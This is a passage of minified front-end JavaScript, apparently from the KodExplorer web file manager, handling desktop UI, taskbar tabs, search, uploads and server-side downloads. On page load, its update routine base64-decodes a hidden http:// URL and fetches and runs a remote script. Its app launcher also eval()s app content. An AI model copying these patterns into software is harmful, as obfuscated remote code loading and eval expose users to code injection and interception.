define("app/src/desktop/main", ["lib/jquery-lib", "lib/util", "lib/contextMenu/jquery-contextMenu", "lib/artDialog/jquery-artDialog", "lib/picasa/picasa", "../../common/taskTap", "../../common/core", "../../tpl/copyright.html", "../../tpl/search.html", "../../tpl/search_list.html", "../../tpl/upload.html", "../../common/rightMenu", "./fileSelect", "./ui", "../explorer/path", "../../common/pathOperate", "../../tpl/fileinfo/file_info.html", "../../tpl/fileinfo/path_info.html", "../../tpl/fileinfo/path_info_more.html", "../../tpl/share.html", "../../tpl/app.html", "../../common/pathOpen", "../../common/CMPlayer"], function(e) {
    Config = {
        BodyContent: ".bodymain",
        FileBoxSelector: ".fileContiner",
        FileBoxClass: ".fileContiner .file",
        FileBoxClassName: "file",
        FileBoxTittleClass: ".fileContiner .title",
        SelectClass: ".fileContiner .select",
        SelectClassName: "select",
        TypeFolderClass: "folderBox",
        TypeFileClass: "fileBox",
        HoverClassName: "hover",
        FileOrderAttr: "number",
        pageApp: "desktop",
        navbar: "navbar",
        AnimateTime: 200
    }, Global = {
        fileListAll: "",
        fileListNum: 0,
        fileRowNum: 0,
        frameLeftWidth: 200,
        treeSpaceWide: 10,
        topbar_height: 40,
        ctrlKey: !1,
        shiftKey: !1,
        fileListSelect: "",
        fileListSelectNum: "",
        isIE: !-[1],
        isDragSelect: !1,
        historyStatus: {
            back: 1,
            next: 0
        }
    }, e("lib/jquery-lib"), e("lib/util"), e("lib/contextMenu/jquery-contextMenu"), e("lib/artDialog/jquery-artDialog"), e("lib/picasa/picasa"), TaskTap = e("../../common/taskTap"), core = e("../../common/core"), rightMenu = e("../../common/rightMenu"), fileSelect = e("./fileSelect"), ui = e("./ui"), ui.path = e("../explorer/path"), fileLight = fileSelect.fileLight, $(document).ready(function() {
        ui.init(), TaskTap.init(), core.update(), fileSelect.init(), rightMenu.initDesktop(), e.async("lib/webuploader/webuploader-min", function() {
            core.upload_init()
        }), $(".init_loading").fadeOut(450).addClass("pop_fadeout"), $(".bodymain").click(function() {
            "block" == $("#menuwin").css("display") && $("#menuwin").css("display", "none")
        }), $(".start").click(function() {
            "block" == $("#menuwin").css("display") ? $("#menuwin").css("display", "none") : $("#menuwin").css("display", "block")
        }), $("#menuwin").click(function() {
            $("#menuwin").css("display", "none")
        }), $(".copyright").click(function() {
            core.copyright()
        }), $(".tab_hide_all").click(function() {
            if (0 != art.dialog.list.length) {
                $(this).toggleClass("this");
                var e = !$(this).hasClass("this");
                $.each(art.dialog.list, function(a, t) {
                    t.display(e)
                })
            }
        })
    })
}), define("app/common/taskTap", [], function() {
    var e = {},
        a = "",
        t = 160,
        i = function() {
            $(".task_tab .tab").die("mouseenter").live("mouseenter", function(e) {
                $(this).hasClass("this") || $(this).addClass("hover"), stopPP(e)
            }).die("click").live("click", function(e) {
                var a = $(this).attr("id"),
                    t = art.dialog.list[a],
                    i = $("." + a);
                "hidden" == i.css("visibility") ? t.display(!0) : i.hasClass("aui_state_focus") ? t.display(!1) : t.zIndex(), stopPP(e)
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass("hover")
            }).die("dblclick").live("dblclick", function() {})
        },
        n = function() {
            var e, a, i, n, s = !1,
                o = !1,
                r = 0,
                l = 0,
                c = 0,
                d = 0,
                p = 0,
                u = 0;
            $(".task_tab .tab").die("mousedown").live("mousedown", function(a) {
                return e = $(this), o = !0, this.setCapture && this.setCapture(), $(document).mousemove(function(e) {
                    f(e)
                }), $(document).one("mouseup", function(e) {
                    return v(e), this.releaseCapture && this.releaseCapture(), stopPP(e), !1
                }), stopPP(a), !1
            });
            var h = function(t) {
                    s = !0, r = t.pageX, $tab_parent = $(".task_tab"), a = $(".task_tab .tab"), $(".tasktab-dragging").remove(), i = e.clone().addClass("tasktab-dragging").prependTo("body"), d = $sizeInt(a.css("margin-right")), p = $tab_parent.width(), u = $tab_parent.get(0).getBoundingClientRect().left, u += $(window).scrollLeft(), l = e.get(0).getBoundingClientRect().left, c = $sizeInt(a.css("width"));
                    var n = e.get(0).getBoundingClientRect().top - $sizeInt(e.css("margin-top")),
                        o = t.clientX - r + l;
                    $("body").prepend("<div class='dragMaskView'></div>"), i.css({
                        width: c + "px",
                        top: n,
                        left: o
                    }), e.css("opacity", 0)
                },
                f = function(t) {
                    if (o) {
                        window.getSelection ? window.getSelection().removeAllRanges() : document.selection.empty(), 0 == s && h(t);
                        var n = t.clientX - r + l;
                        u > n || n > u + p - c || (i.css("left", n), a.each(function() {
                            var a = $(this).get(0).getBoundingClientRect().left;
                            if (n > a && a + c / 2 + d > n) {
                                if (e.attr("id") == $(this).attr("id")) return;
                                m($(this).attr("id"), "left")
                            }
                            if (n > a - c / 2 + d && a > n) {
                                if (e.attr("id") == $(this).attr("id")) return;
                                m($(this).attr("id"), "right")
                            }
                        }))
                    }
                },
                m = function(i, s) {
                    if (!e.is(":animated") || n != i) {
                        n = i, e.stop(!0, !0), $(".insertTemp").remove(), a = $(".task_tab .tab");
                        var o = e.width(),
                            r = $(".task_tab #" + i),
                            l = e.clone(!0).insertAfter(e).css({
                                "margin-right": "0px",
                                border: "none"
                            }).addClass("insertTemp");
                        "left" == s ? e.after(r).css("width", "0px") : (e.before(r).css("width", "0px"), r.before(l)), e.animate({
                            width: o + "px"
                        }, t), l.animate({
                            width: "0px"
                        }, t, function() {
                            $(this).remove(), a = $(".task_tab .tab")
                        })
                    }
                },
                v = function() {
                    o = !1, s = !1, startTime = 0, $(".dragMaskView").remove(), void 0 != i && (l = e.get(0).getBoundingClientRect().left, i.animate({
                        left: l + "px"
                    }, t, function() {
                        e.css("opacity", 1), $(this).remove()
                    }))
                }
        },
        s = function(e) {
            var a = 110,
                i = a,
                n = a + 12,
                s = $(".task_tab .tab"),
                o = $(".task_tab .tabs").width() - 10,
                r = s.length,
                l = Math.floor(o / n);
            switch (r > l && (i = Math.floor(o / r) - 12), e) {
                case "add":
                    $(".task_tab .tabs .this").css("width", "0").animate({
                        width: i + "px"
                    }, t);
                case "close":
                    s.animate({
                        width: i + "px"
                    }, t);
                    break;
                case "resize":
                    s.css("width", i + "px");
                    break;
                default:
            }
        },
        o = function(a, t) {
            $(".task_tab").removeClass("hidden");
            var i = t.replace(/<[^>]+>/g, ""),
                n = '<div class="tab taskBarMenu" id="' + a + '" title="' + i + '">' + t + "</div>";
            $(n).insertBefore(".task_tab .last"), s("add"), e[a] = {
                id: a,
                name: name
            }
        },
        r = function(e) {
            $(".task_tab .this").removeClass("this"), $(".task_tab #" + e).addClass("this"), a = e
        },
        l = function(a) {
            delete e[a], $(".task_tab #" + a).animate({
                width: 0
            }, t, function() {
                $(".task_tab #" + a).remove(), s("close"), 0 == $(".tabs .tab").length && "desktop" != Config.pageApp && $(".task_tab").addClass("hidden")
            })
        };
    return {
        add: o,
        focus: r,
        close: l,
        init: function() {
            var e = '<div class="task_tab"><div class="tabs"><div class="last" style="clear:both;"></div></div></div>';
            $(e).appendTo("body"), "desktop" != Config.pageApp && $(".task_tab").addClass("hidden"), $(window).bind("resize", function() {
                s("resize")
            }), i(), n()
        }
    }
}), define("app/common/core", [], function(require, exports) {
    return {
        filetype: {
            image: ["jpg", "jpeg", "png", "bmp", "gif", "ico"],
            music: ["mp3", "wma", "wav", "mid", "m4a", "aac", "midi"],
            movie: ["avi", "flv", "f4v", "wmv", "3gp", "mp4", "wmv", "asf", "m4v", "mov", "mpg"],
            doc: ["doc", "docx", "docm", "xls", "xlsx", "xlsb", "xlsm", "ppt", "pptx", "pptm"],
            text: ["oexe", "inc", "inf", "csv", "log", "asc", "tsv"],
            code: ["abap", "abc", "as", "ada", "adb", "htgroups", "htpasswd", "conf", "htaccess", "htgroups", "htpasswd", "asciidoc", "asm", "ahk", "bat", "cmd", "c9search_results", "cpp", "c", "cc", "cxx", "h", "hh", "hpp", "cirru", "cr", "clj", "cljs", "CBL", "COB", "coffee", "cf", "cson", "Cakefile", "cfm", "cs", "css", "curly", "d", "di", "dart", "diff", "patch", "Dockerfile", "dot", "dummy", "dummy", "e", "ejs", "ex", "exs", "elm", "erl", "hrl", "frt", "fs", "ldr", "ftl", "gcode", "feature", ".gitignore", "glsl", "frag", "vert", "go", "groovy", "haml", "hbs", "handlebars", "tpl", "mustache", "hs", "hx", "html", "htm", "xhtml", "erb", "rhtml", "ini", "cfg", "prefs", "io", "jack", "jade", "java", "js", "jsm", "json", "jq", "jsp", "jsx", "jl", "tex", "latex", "ltx", "bib", "lean", "hlean", "less", "liquid", "lisp", "ls", "logic", "lql", "lsl", "lua", "lp", "lucene", "Makefile", "GNUmakefile", "makefile", "OCamlMakefile", "make", "md", "markdown", "mask", "matlab", "mel", "mc", "mush", "mysql", "nix", "m", "mm", "ml", "mli", "pas", "p", "pl", "pm", "pgsql", "php", "phtml", "ps1", "praat", "praatscript", "psc", "proc", "plg", "prolog", "properties", "proto", "py", "r", "Rd", "Rhtml", "rb", "ru", "gemspec", "rake", "Guardfile", "Rakefile", "Gemfile", "rs", "sass", "scad", "scala", "scm", "rkt", "scss", "sh", "bash", ".bashrc", "sjs", "smarty", "tpl", "snippets", "soy", "space", "sql", "styl", "stylus", "svg", "tcl", "tex", "txt", "textile", "toml", "twig", "ts", "typescript", "str", "vala", "vbs", "vb", "vm", "v", "vh", "sv", "svh", "vhd", "vhdl", "xml", "rdf", "rss", "wsdl", "xslt", "atom", "mathml", "mml", "xul", "xbl", "xaml", "xq", "yaml", "yml", "htm", "xib", "storyboard", "plist", "csproj"],
            bindary: ["pdf", "bin", "zip", "swf", "gzip", "rar", "arj", "tar", "gz", "cab", "tbz", "tbz2", "lzh", "uue", "bz2", "ace", "exe", "so", "dll", "chm", "rtf", "odp", "odt", "pages", "class", "psd", "ttf", "fla", "7z", "dmg", "iso", "dat", "ipa"]
        },
        ico: function(e) {
            var a = G.static_path + "images/file_16/",
                t = ["folder", "file", "edit", "search", "up", "setting", "appStore", "error", "info", "mp3", "flv", "pdf", "doc", "xls", "ppt", "html", "swf"],
                i = $.inArray(e, t);
            return -1 == i ? a + "file.png" : a + e + ".png"
        },
        contextmenu: function(e) {
            try {
                rightMenu.hidden()
            } catch (a) {}
            var a = e || window.event;
            return a ? a && $(a.target).is("textarea") || $(a.target).is("input") || 0 != $(a.target).parents(".topbar").length || 0 != $(a.target).parents(".edit_body").length || 0 != $(a.target).parents(".aui_state_focus").length ? !0 : !1 : !0
        },
        pathThis: function(e) {
            e = e.replace(/\\/g, "/");
            var a = e.split("/"),
                t = a[a.length - 1];
            if ("" == t && (t = a[a.length - 2]), 0 == t.search("fileProxy")) {
                t = urlDecode(t.substr(t.search("&path=")));
                var a = t.split("/");
                t = a[a.length - 1], "" == t && (t = a[a.length - 2])
            }
            return t
        },
        pathFather: function(e) {
            e = e.replace(/\\/g, "/");
            var a = e.lastIndexOf("/");
            return e.substr(0, a + 1)
        },
        pathExt: function(e) {
            e = e.replace(/\\/g, "/"), e = e.replace(/\/+/g, "/");
            var a = e.lastIndexOf(".");
            return e = e.substr(a + 1), e.toLowerCase()
        },
        path2url: function(e) {
            if ("http" == e.substr(0, 4)) return e;
            if (e = e.replace(/\\/g, "/"), e = e.replace(/\/+/g, "/"), e = e.replace(/\/\.*\//g, "/"), G.is_root && e.substring(0, G.web_root.length) == G.web_root) return G.web_host + e.replace(G.web_root, "");
            var a = G.app_host + "/index.php?explorer/fileProxy&path=" + urlEncode(e);
            return G.share_page !== void 0 && (a = G.app_host + "/index.php?share/fileProxy&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode(e)), a
        },
        authCheck: function(e, a) {
            return G.is_root ? !0 : AUTH.hasOwnProperty(e) ? AUTH[e] ? !0 : (void 0 == a && (a = LNG.no_permission), core.tips.tips(a, !1), !1) : !0
        },
        ajaxError: function(e) {
            core.tips.close(LNG.system_error, !1);
            var a = e.responseText,
                t = '<div class="ajaxError">' + a + "</div>",
                i = $.dialog.list.ajaxErrorDialog;
            return "<!--user login-->" == a.substr(0, 17) ? (FrameCall.goRefresh(), void 0) : (i ? i.content(t) : $.dialog({
                id: "ajaxErrorDialog",
                padding: 0,
                fixed: !0,
                resize: !0,
                ico: core.ico("error"),
                title: "ajax error",
                content: t
            }), void 0)
        },
        file_get: function(e, a) {
            var t = "./index.php?editor/fileGet&filename=" + urlEncode2(e);
            G.share_page !== void 0 && (t = "./index.php?share/fileGet&user=" + G.user + "&sid=" + G.sid + "&filename=" + urlEncode2(e)), $.ajax({
                url: t,
                dataType: "json",
                beforeSend: function() {
                    core.tips.loading(LNG.loading)
                },
                error: core.ajaxError,
                success: function(e) {
                    core.tips.close(LNG.success), "function" == typeof a && a(e.data.content)
                }
            })
        },
        setting: function(e) {
            void 0 == e && (e = G.is_root ? "system" : "user"), void 0 == window.top.frames.Opensetting_mode ? $.dialog.open("./index.php?setting#" + e, {
                id: "setting_mode",
                fixed: !0,
                ico: core.ico("setting"),
                resize: !0,
                title: LNG.setting,
                width: 960,
                height: 580
            }) : ($.dialog.list.setting_mode.display(!0), FrameCall.top("Opensetting_mode", "Setting.setGoto", '"' + e + '"'))
        },
        copyright: function() {
            var e = require("../tpl/copyright.html"),
                a = template.compile(e),
                t = a({
                    LNG: LNG,
                    G: G
                });
            $.dialog({
                id: "copyright_dialog",
                bottom: 0,
                right: 0,
                simple: !0,
                resize: !1,
                title: LNG.about + " kod",
                width: 425,
                padding: "0",
                fixed: !0,
                content: t
            })
        },
        appStore: function() {
            $.dialog.open("./index.php?app", {
                id: "app_store",
                fixed: !0,
                ico: core.ico("appStore"),
                resize: !0,
                title: LNG.app_store,
                width: 900,
                height: 550
            })
        },
        openIE: function(e) {
            $.dialog.open(e, {
                fixed: !0,
                resize: !0,
                title: LNG.app_store,
                width: "80%",
                height: "70%"
            })
        },
        openApp: function(app) {
            if ("url" == app.type) {
                var icon = app.icon; - 1 == app.icon.search(G.static_path) && "http" != app.icon.substring(0, 4) && (icon = G.static_path + "images/app/" + app.icon), "number" != typeof app.width && -1 == app.width.search("%") && (app.width = parseInt(app.width)), "number" != typeof app.height && -1 == app.height.search("%") && (app.height = parseInt(app.height)), $.dialog.open(app.content, {
                    title: app.name,
                    fixed: !0,
                    ico: icon,
                    resize: app.resize,
                    simple: app.simple,
                    title: app.name.replace(".oexe", ""),
                    width: app.width,
                    height: app.height
                })
            } else {
                var exec = app.content;
                eval("{" + exec + "}")
            }
        },
        update: function(e) {
            var a = base64_decode("aHR0cDovL3N0YXRpYy5rYWxjYWRkbGUuY29tL3VwZGF0ZS9tYWluLmpz") + "?a=" + UUID();
            require.async(a, function(a) {
                try {
                    a.todo(e)
                } catch (t) {}
            })
        },
        explorer: function(e, a) {
            void 0 == e && (e = ""), void 0 == a && (a = core.pathThis(e));
            var t = "./index.php?/explorer&type=iframe&path=" + e;
            G.share_page !== void 0 && (t = "./index.php?share/folder&type=iframe&user=" + G.user + "&sid=" + G.sid + "&path=" + e), $.dialog.open(t, {
                resize: !0,
                fixed: !0,
                ico: core.ico("folder"),
                title: a,
                width: 880,
                height: 550
            })
        },
        explorerCode: function(e) {
            void 0 == e && (e = "");
            var a = "index.php?/editor&project=" + e;
            G.share_page !== void 0 && (a = "./index.php?share/code_read&user=" + G.user + "&sid=" + G.sid + "&project=" + e), $.dialog.open(a, {
                resize: !0,
                fixed: !0,
                ico: core.ico("folder"),
                title: core.pathThis(e),
                width: "80%",
                height: "70%"
            })
        },
        setSkin_finished: function() {
            var e = $(".setSkin_finished").attr("src");
            e && ($("#link_css_list").attr("href", e), $(".setSkin_finished").remove())
        },
        setSkin: function(e, a) {
            var t = G.static_path + "style/skin/" + e + a;
            $("body").append('<img src="' + t + '" onload="core.setSkin_finished();" onerror="core.setSkin_finished();" class="setSkin_finished">')
        },
        editorFull: function() {
            var e = $("iframe[name=OpenopenEditor]");
            e.toggleClass("frame_fullscreen")
        },
        language: function(e) {
            Cookie.set("kod_user_language", e, 8760), window.location.reload()
        },
        tips: {
            topHeight: function() {
                return "undefined" != typeof Global && Global.topbar_height ? Global.topbar_height : 0
            },
            loading: function(e) {
                Tips.loading(e, "info", core.tips.topHeight())
            },
            close: function(e, a) {
                "object" == typeof e ? Tips.close(e.data, e.code, core.tips.topHeight()) : Tips.close(e, a, core.tips.topHeight())
            },
            tips: function(e, a) {
                "object" == typeof e ? Tips.tips(e.data, e.code, core.tips.topHeight()) : Tips.tips(e, a, core.tips.topHeight())
            }
        },
        fullScreen: function() {
            "true" == $("body").attr("fullScreen") && core.exitfullScreen(), $("body").attr("fullScreen", "true");
            var e = document.documentElement;
            e.requestFullscreen ? e.requestFullscreen() : e.mozRequestFullScreen ? e.mozRequestFullScreen() : e.webkitRequestFullScreen && e.webkitRequestFullScreen()
        },
        exitfullScreen: function() {
            $("body").attr("fullScreen", "false"), document.exitFullscreen ? document.exitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitCancelFullScreen && document.webkitCancelFullScreen()
        },
        createFlash: function(e, a, t) {
            var i = '<object type="application/x-shockwave-flash" id="' + t + '" data="' + e + '" width="100%" height="100%">' + '<param name="movie" value="' + e + '"/>' + '<param name="allowfullscreen" value="true" />' + '<param name="allowscriptaccess" value="always" />' + '<param name="flashvars" value="' + a + '" />' + '<param name="wmode" value="transparent" />' + "</object>";
            return i
        },
        search: function(e, a) {
            var t, i, n = require("../tpl/search.html"),
                s = require("../tpl/search_list.html"),
                o = function() {
                    var s = template.compile(n);
                    0 == $(".dialog_do_search").length ? (l(), i = {
                        search: e,
                        path: a,
                        is_content: void 0,
                        is_case: void 0,
                        ext: "",
                        LNG: LNG
                    }, t = $.dialog({
                        id: "dialog_do_search",
                        padding: 0,
                        fixed: !0,
                        ico: core.ico("search"),
                        resize: !0,
                        title: LNG.search,
                        width: 450,
                        content: s(i)
                    }), c(i), $("#search_ext").tooltip({
                        placement: "bottom",
                        html: !0
                    }), $("#search_path").tooltip({
                        placement: "bottom",
                        html: !0,
                        title: function() {
                            return $("#search_path").val()
                        }
                    })) : ($("#search_value").val(e), $("#search_path").val(a), r(), $.dialog.list.dialog_do_search.display(!0))
                },
                r = function() {
                    i = {
                        search: $("#search_value").val(),
                        path: $("#search_path").val(),
                        is_content: $("#search_is_content").attr("checked"),
                        is_case: $("#search_is_case").attr("checked"),
                        ext: $("#search_ext").val()
                    }, c(i)
                },
                l = function() {
                    $("#search_value").die("keyup").live("keyup", function() {
                        ui.path.setSearchByStr($(this).val())
                    }), $("#search_value,#search_ext,#search_path").keyEnter(r), $(".search_header a.button").die("click").live("click", r), $(".search_result .list .name").die("click").live("click", function() {
                        var e = $(this).find("a").html(),
                            a = $(this).parent().find(".path a").html() + e;
                        $(this).parent().hasClass("file") ? ui.pathOpen.open(a) : "explorer" == Config.pageApp ? ui.path.list(a + "/", "tips") : core.explorer(a + "/")
                    }), $(".search_result .list .path a").die("click").live("click", function() {
                        var e = $(this).html();
                        "explorer" == Config.pageApp ? ui.path.list(e, "tips") : core.explorer(e)
                    })
                },
                c = function(e) {
                    var a = 150;
                    $("#search_value").focus(), $(".search_result .list").remove();
                    var t = $(".search_result .message td");
                    if (!e.search || !e.path) return t.hide().html(LNG.search_info).fadeIn(a), void 0;
                    if (1 >= e.search.length) return t.hide().html("too short!").fadeIn(a), void 0;
                    var i = "index.php?explorer/search";
                    G.share_page !== void 0 && (i = "index.php?share/search&user=" + G.user + "&sid=" + G.sid), $.ajax({
                        url: i,
                        dataType: "json",
                        type: "POST",
                        data: e,
                        beforeSend: function() {
                            t.hide().html(LNG.searching + '<img src="' + G.static_path + 'images/loading.gif">').fadeIn(a)
                        },
                        error: core.ajaxError,
                        success: function(e) {
                            if (!e.code) return t.hide().html(e.data).fadeIn(a), void 0;
                            if (0 == e.data.filelist.length && 0 == e.data.folderlist.length) return t.hide().html(LNG.search_null).fadeIn(a), void 0;
                            t.hide();
                            var i = template.compile(s);
                            e.data.LNG = LNG, $(i(e.data)).insertAfter(".search_result .message").fadeIn(a)
                        }
                    })
                };
            o()
        },
        server_dwonload: function(e) {
            core.upload_check("explorer:serverDownload");
            var a = $(".download_box"),
                t = a.find("#download_list"),
                i = a.find("input").val();
            if (a.find("input").val(""), !i || "http" != i.substr(0, 4)) return core.tips.tips("url false!", !1), void 0;
            var n = UUID(),
                s = '<div id="' + n + '" class="item">' + '<div class="info"><span class="title" tytle="' + i + '">' + core.pathThis(i) + "</span>" + '<span class="size">0b</span>' + '<span class="state">' + LNG.upload_ready + "</span>" + '<a class="remove font-icon icon-remove" href="javascript:void(0)"></a>' + '<div style="clear:both"></div></div></div>';
            t.find(".item").length > 0 ? $(s).insertBefore(t.find(".item:eq(0)")) : t.append(s);
            var o, r, l, c = 0,
                d = $("#" + n),
                p = $("#" + n + " .state").text(LNG.download_ready),
                u = $('<div class="progress progress-striped active"><div class="progress-bar" role="progressbar" style="width: 0%;text-align:right;"></div></div>').appendTo("#" + n).find(".progress-bar");
            $("#" + n + " .remove").bind("click", function() {
                $.get("./index.php?explorer/serverDownload&type=remove&uuid=" + n), $(this).parent().parent().slideUp(function() {
                    $(this).remove(), ui.f5()
                })
            }), $.ajax({
                url: "./index.php?explorer/serverDownload&type=download&save_path=" + e + "&url=" + urlEncode2(i) + "&uuid=" + n,
                dataType: "json",
                error: function(e, a, t) {
                    core.ajaxError(e, a, t), clearInterval(o), o = !1, clearTimeout(r), o = !1, u.parent().remove(), p.addClass("error").text(LNG.download_error)
                },
                success: function(e) {
                    clearInterval(o), o = !1, clearTimeout(r), o = !1, e.code ? (ui.f5_callback(function() {
                        ui.path.setSelectByFilename(e.info)
                    }), p.text(LNG.download_success), $("#" + n + " .info .title").html(e.info)) : p.addClass("error").text(LNG.error), u.parent().remove()
                }
            });
            var h = function() {
                $.ajax({
                    url: "./index.php?explorer/serverDownload&type=percent&uuid=" + n,
                    dataType: "json",
                    success: function(e) {
                        var a = "",
                            t = e.data;
                        if (o) {
                            if (!e.code) return p.text(LNG.loading), void 0;
                            if (t) {
                                if (t.size = parseFloat(t.size), t.time = parseFloat(t.time), l) {
                                    var i = (t.size - l.size) / (t.time - l.time);
                                    if (c > .2 * i) {
                                        var n = c;
                                        c = i, i = n
                                    } else c = i;
                                    a = core.file_size(i) + "/s"
                                }
                                if (0 == t.length) d.find(".progress-bar").css("width", "100%").text(LNG.loading);
                                else {
                                    var s = 100 * (t.size / t.length);
                                    d.find(".progress-bar").css("width", s + "%"), p.text(parseInt(s) + "%(" + a + ")")
                                }
                                d.find(".size").text(core.file_size(t.length)), l = t
                            }
                        }
                    }
                })
            };
            r = setTimeout(function() {
                h(), o = setInterval(function() {
                    h()
                }, 1e3)
            }, 100)
        },
        file_size: function(e) {
            if (0 == e) return "0B";
            e = parseFloat(e);
            var a = {
                GB: 1073741824,
                MB: 1048576,
                KB: 1024,
                "B ": 0
            };
            for (var t in a)
                if (e >= a[t]) return (e / a[t]).toFixed(1) + t;
            return "0B"
        },
        upload_check: function(e) {
            return void 0 == e && (e = "explorer:fileUpload"), !G.is_root && AUTH.hasOwnProperty(e) && 1 != AUTH[e] ? (core.tips.tips(LNG.no_permission, !1), void 0) : "*recycle*/" == G.this_path || "*share*/" == G.this_path || "*share*/" == G.this_path || G.json_data && "writeable" != G.json_data.path_type ? (core.tips.tips(LNG.no_permission_write, !1), !1) : !0
        },
        upload: function() {
            G.upload_path = G.this_path;
            var e = urlDecode(G.upload_path);
            if (uploader.option("server", "index.php?explorer/fileUpload&path=" + urlEncode(G.upload_path)), 30 >= e.length ? e : "..." + e.substr(e.length - 30), 0 != $(".dialog_file_upload").length) return $.dialog.list.dialog_file_upload.display(!0), void 0;
            var a = require("../tpl/upload.html"),
                t = template.compile(a),
                i = WebUploader.Base.formatSize(G.upload_max);
            $.dialog({
                padding: 5,
                resize: !0,
                ico: core.ico("up"),
                id: "dialog_file_upload",
                fixed: !0,
                title: LNG.upload_muti,
                content: t({
                    LNG: LNG,
                    maxsize: i
                }),
                close: function() {
                    $.each(uploader.getFiles(), function(e, a) {
                        uploader.skipFile(a), uploader.removeFile(a)
                    })
                }
            }), $(".file_upload .tips").tooltip({
                placement: "bottom"
            }), $(".file_upload .top_nav a.menu").unbind("click").bind("click", function() {
                $(this).hasClass("tab_upload") ? ($(".file_upload .tab_upload").addClass("this"), $(".file_upload .tab_download").removeClass("this"), $(".file_upload .upload_box").removeClass("hidden"), $(".file_upload .download_box").addClass("hidden")) : ($(".file_upload .tab_upload").removeClass("this"), $(".file_upload .tab_download").addClass("this"), $(".file_upload .upload_box").addClass("hidden"), $(".file_upload .download_box").removeClass("hidden"))
            }), $(".file_upload .download_box button").unbind("click").bind("click", function() {
                core.server_dwonload(G.upload_path)
            }), uploader.addButton({
                id: "#picker"
            })
        },
        upload_init: function() {
            var e = "#thelist",
                a = !0;
            $.browser.msie && (a = !1);
            var t = 10485760;
            t >= G.upload_max && (t = .8 * G.upload_max), uploader = WebUploader.create({
                swf: G.static_path + "js/lib/webuploader/Uploader.swf",
                dnd: "body",
                threads: 2,
                compress: !1,
                resize: !1,
                prepareNextFile: !0,
                duplicate: !0,
                chunked: a,
                chunkRetry: 3,
                chunkSize: t
            }), $("#uploader .success").die("click").live("click", function() {
                var e = $(this).find("span.title").attr("title");
                "explorer" == Config.pageApp ? ui.path.list(core.pathFather(e), "tips", function() {
                    ui.path.setSelectByFilename(core.pathThis(e))
                }) : core.explorer(core.pathFather(e))
            }), $("#uploader .open").die("click").live("click", function(e) {
                var a = $(this).find("span.title").attr("title");
                ui.pathOpen.open(a), stopPP(e)
            }), $(".upload_box_clear").die("click").live("click", function() {
                $("#thelist .success,#thelist .error").each(function() {
                    $(this).slideUp(300, function() {
                        $(this).remove()
                    })
                })
            }), $(".upload_box_setting").die("click").live("click", function() {
                $(".upload_box_config").toggleClass("hidden")
            }), $("#uploader .remove").die("click").live("click", function(e) {
                var a = $(this).parent().parent().attr("id");
                uploader.skipFile(a), uploader.removeFile(a, !0), $(this).parent().parent().slideUp(function() {
                    $(this).remove()
                }), stopPP(e)
            });
            var i = 0,
                n = 0,
                s = "0B/s",
                o = function(e, a) {
                    var t = e.size * a,
                        i = 3;
                    e.speed === void 0 ? e.speed = [
                        [time() - 500, 0],
                        [time(), t]
                    ] : i >= e.speed.length ? e.speed.push([time(), t]) : (e.speed = e.speed.slice(1, i), e.speed.push([time(), t]));
                    var n = e.speed[e.speed.length - 1],
                        o = e.speed[0],
                        r = (n[1] - o[1]) / ((n[0] - o[0]) / 1e3);
                    return r = core.file_size(r) + "/s", s = r, r
                },
                r = [];
            uploader.on("uploadBeforeSend", function(e, a) {
                var t = urlEncode(e.file.fullPath);
                (void 0 == t || "undefined" == t) && (t = ""), a.fullPath = t
            }).on("fileQueued", function(a) {
                if (!core.upload_check()) return uploader.skipFile(a), uploader.removeFile(a), void 0;
                var t, n = $(e),
                    t = a.fullPath;
                a.finished = !1, (void 0 == t || "undefined" == t) && (t = a.name), i++, $(e).find(".item").length > 0 && (n = $(e).find(".item:eq(0)"));
                var s = '<div id="' + a.id + '" class="item"><div class="info">' + '<span class="title" title="' + G.upload_path + t + '">' + core.pathThis(t) + "</span>" + '<span class="size">' + core.file_size(a.size) + "</span>" + '<span class="state">' + LNG.upload_ready + "</span>" + '<a class="remove font-icon icon-remove" href="javascript:void(0)"></a>' + '<div style="clear:both"></div></div></div>';
                $(e).find(".item").length > 0 ? $(s).insertBefore($(e).find(".item:eq(0)")) : $(e).append(s), uploader.upload()
            }).on("uploadProgress", function(e, a) {
                $(".dialog_file_upload .aui_title").text(LNG.uploading + ": " + n + "/" + i + " (" + s + ")");
                var t = o(e, a),
                    r = $("#" + e.id),
                    l = r.find(".progress .progress-bar");
                l.length || (l = $('<div class="progress progress-striped active"><div class="progress-bar" role="progressbar" style="width: 0%"></div></div>').appendTo(r).find(".progress-bar")), r.find(".state").text(parseInt(100 * a) + "%(" + t + ")"), l.css("width", 100 * a + "%")
            }).on("uploadAccept", function(e, a) {
                e.file.serverData = a;
                try {
                    r.push(core.pathThis(a.info))
                } catch (t) {}
            }).on("uploadSuccess", function(e) {
                var a = 36 * $("#" + e.id).index(".item");
                $("#uploader").scrollTop(a), n++;
                var t = e.serverData;
                if (t.code ? ($("#" + e.id).addClass("success"), $("#" + e.id).find(".state").text(t.data), $("#" + e.id).find(".remove").removeClass("icon-remove").addClass("icon-ok").addClass("open").removeClass("remove")) : ($("#" + e.id).find(".state").addClass("error"), $("#" + e.id).find(".state").text(t.data).attr("title", t.data)), uploader.removeFile(e), $("#" + e.id).find(".progress").fadeOut(), !e.fullPath) {
                    var i = r;
                    ui.f5_callback(function() {
                        ui.path.setSelectByFilename(i)
                    })
                }
            }).on("uploadError", function(e, a) {
                n++, $("#" + e.id).find(".progress").fadeOut(), $("#" + e.id).find(".state").addClass("error"), $("#" + e.id).find(".state").text(LNG.upload_error + "(" + a + ")")
            }).on("uploadFinished", function() {
                $(".dialog_file_upload .aui_title").text(LNG.upload_success + ": " + n + "/" + i), i = 0, n = 0, uploader.reset(), "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path);
                var e = r;
                ui.f5_callback(function() {
                    ui.path.setSelectByFilename(e), r = []
                })
            }).on("error", function(e) {
                core.tips.tips(e, !1)
            });
            var l;
            inState = !1, dragOver = function() {
                0 == inState && (inState = !0, MaskView.tips(LNG.upload_drag_tips)), l && window.clearTimeout(l)
            }, dragLeave = function(e) {
                stopPP(e), l && window.clearTimeout(l), l = window.setTimeout(function() {
                    inState = !1, MaskView.close()
                }, 100)
            }, dragDrop = function(e) {
                try {
                    if (e = e.originalEvent || e, core.upload_check()) {
                        var a = e.dataTransfer.getData("text/plain");
                        a && "http" == a.substring(0, 4) ? ui.pathOperate.appAddURL(a) : core.upload()
                    }
                    stopPP(e)
                } catch (e) {}
